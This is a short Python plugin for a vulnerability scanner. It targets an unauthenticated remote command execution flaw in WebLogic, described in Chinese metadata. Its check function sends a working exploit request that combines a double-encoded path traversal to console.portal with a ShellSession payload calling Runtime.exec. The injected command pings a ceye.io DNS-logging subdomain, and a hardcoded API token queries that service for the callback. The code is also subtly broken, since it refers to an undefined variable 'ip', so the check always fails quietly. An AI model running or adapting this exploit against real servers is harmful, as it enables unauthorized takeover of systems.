#!/usr/bin/python
#coding=utf-8
import requests
import sys


def get_plugin_info():
    plugin_info = {
        "name": "Weblogic 未授权命令执行漏洞",
        "info": "WebLogic 特定版本存在 命令执行漏洞，未授权 的攻击者可通过发送精心构造的恶意请求，触发反序列化，造成远程命令执行，从而获取服务器权限。",
        "level": "紧急",
        "type": "任意命令执行",
        "author": "zinc",
        "url": "https://www.cnblogs.com/potatsoSec/p/13895120.html",
        "keyword": "tag:webLogic",
        "source": 1
    }
    return plugin_info

def check_dnslog(target):
    url = 'http://api.ceye.io/v1/records?token=475b1fa59d53a9b2cedfdd8c98ff4ace&type=dns&filter='+ target[:19]
    #print url
    try:
        r = requests.get(url=url)
        #print r.content
        if 'id' in r.content and 'name' in r.content:
            #print r.content
            return True
        return False
    except:
        return False


def check(host, port, timeout):
  cmd = 'ping %s_%d.8em7js.ceye.io' % (host, port)
  path = "/console/images/%252E%252E%252Fconsole.portal"
  url = "{}:{}{}".format(host, port, path)

  payload = "?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('{}');\");".format(cmd)
  headers = {
      "User-Agent": "Mozilla", 
      "Accept-Encoding": "gzip, deflate",
      "cmd": "tasklist", 
      "Content-Type": "application/x-www-form-urlencoded"
  }

  try:
      url = url+payload
      response = requests.get(url,headers=headers,timeout=10,verify=False)
      if check_dnslog(ip):
          return True
  except:pass
  
  return False

if __name__ == '__main__':
    check('127.0.0.1', 80, 3)